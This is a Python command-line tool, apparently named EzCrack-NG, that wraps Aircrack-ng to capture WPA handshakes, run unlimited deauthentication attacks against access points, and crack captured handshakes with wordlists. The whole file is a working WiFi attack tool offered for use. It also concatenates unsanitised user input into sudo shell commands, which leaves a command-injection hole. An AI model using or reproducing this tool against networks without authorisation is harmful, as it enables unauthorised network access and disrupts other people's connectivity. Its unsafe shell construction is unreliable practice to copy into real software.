import os
from colorama import Fore, Back, Style

try:
    os.system("clear")

    print(Fore.BLUE + "")
    print("                             ██████████████                                       ")
    print("                         ████              ████                                   ")
    print("                       ██                      ██                                 ")
    print("                             ██████████████                                       ")
    print("                           ██              ██                                     ")
    print("                                ████████                                          ")
    print("                              ██        ██                                        ")
    print("                                   ██                                           \n")
    print("███████╗███████╗ ██████╗██████╗  █████╗  ██████╗██╗  ██╗     ███╗   ██╗ ██████╗   ")
    print("██╔════╝╚══███╔╝██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝     ████╗  ██║██╔════╝   ")
    print("█████╗    ███╔╝ ██║     ██████╔╝███████║██║     █████╔╝█████╗██╔██╗ ██║██║  ███╗  ")
    print("██╔══╝   ███╔╝  ██║     ██╔══██╗██╔══██║██║     ██╔═██╗╚════╝██║╚██╗██║██║   ██║  ")
    print("███████╗███████╗╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗     ██║ ╚████║╚██████╔╝  ")
    print("╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝     ╚═╝  ╚═══╝ ╚═════╝ \n")
    print("                       Cracking WiFi network with ease                          \n")
    print("--------------------------------------------------------------------------------  ")
    print("              By: DanhHien | Based on Aircrack-ng suite of tools                  ")
    print("--------------------------------------------------------------------------------\n")

    print(Fore.YELLOW + "[1] Cracking WiFi network")
    print("[2] DeAuthing WiFi network (for grabbing handshake)")
    print("[3] Cracking handshake file (.cap)\n")
    selectfunction = input(Fore.WHITE + "Please select a function: ")

    if selectfunction == "1":
        print(Fore.GREEN)
        os.system("sudo airmon-ng")
        interface = input(Fore.WHITE + "Please select an interface, leave blank for default interface (wlp0s20f0u1): ")
        if interface == "":
            interface = "wlp0s20f0u1"
        print(Fore.GREEN)
        os.system("sudo airodump-ng " + interface)
        bssid = input(Fore.WHITE + "\nPlease enter access point's bssid: ")
        ch = input(Fore.WHITE + "\nPlease enter access point's channel: ")
        capfilename = bssid + "_" + ch
        print(Fore.GREEN)
        os.system("sudo airodump-ng -c " + ch + " --bssid " + bssid + " -w " + capfilename + " " + interface)
        wordlist = input("\nPlease enter wordlist file (can be a file in this directory or a file path, leave blank for default wordlist): ")
        if wordlist == "":
            wordlist = "Default.txt"
        print(Fore.GREEN)
        os.system("sudo aircrack-ng -w " + wordlist + " -b " + bssid + " " + capfilename + "*.cap")
        print(Fore.YELLOW + "Done cracking, exiting...")
        print(Style.RESET_ALL)
        

    elif selectfunction == "2":
        print(Fore.YELLOW + "[1] Manual enter access point's bssid and channel")
        print("[2] Scan for access point and enter bssid / channel\n")
        mode = input(Fore.WHITE + "Please select a mode: ")
        if mode == "1":
            print(Fore.GREEN)
            os.system("sudo airmon-ng")
            interface = input(Fore.WHITE + "Please select an interface, leave blank for default interface (wlp0s20f0u1): ")
            if interface == "":
                interface = "wlp0s20f0u1"
            bssid = input(Fore.WHITE + "Please enter bssid: ")
            ch = input(Fore.WHITE + "Please enter channel: ")
            print(Fore.GREEN)
            os.system("sudo airmon-ng start " + interface + " " + ch)
            os.system("sudo aireplay-ng --deauth 0 -a " + bssid + " " + interface)
            print(Style.RESET_ALL)

        if mode == "2":
            os.system("sudo airmon-ng")
            interface = input(Fore.WHITE + "Please select an interface, leave blank for default interface (wlp0s20f0u1): ")
            if interface == "":
                interface = "wlp0s20f0u1"
            print(Fore.GREEN)
            os.system("sudo airodump-ng " + interface)
            bssid = input(Fore.WHITE + "Please enter bssid: ")
            ch = input(Fore.WHITE + "Please enter channel: ")
            print(Fore.GREEN)
            os.system("sudo airmon-ng start " + interface + " " + ch)
            os.system("sudo aireplay-ng --deauth 0 -a " + bssid + " " + interface)
            print(Style.RESET_ALL)

    elif selectfunction == "3":
        print(Fore.GREEN)
        os.system("ls *.cap")
        capfile = input(Fore.WHITE + "Please enter .cap file name in the current directory or a file path: ")
        wordlist = input("\nPlease enter wordlist file (can be a file in this directory or a file path, leave blank for default wordlist): ")
        if wordlist == "":
            wordlist = "Default.txt"
        print(Fore.GREEN)
        os.system("sudo aircrack-ng -w " + wordlist + " " + capfile)
        print(Fore.YELLOW + "Done cracking, exiting...")
        print(Style.RESET_ALL)

    else:
        print(Fore.RED + "No function selected")
        print(Style.RESET_ALL)
        exit()

except KeyboardInterrupt:
    print(Fore.RED + "\n\nKeyboard interrupt, exiting...")
    print(Style.RESET_ALL)
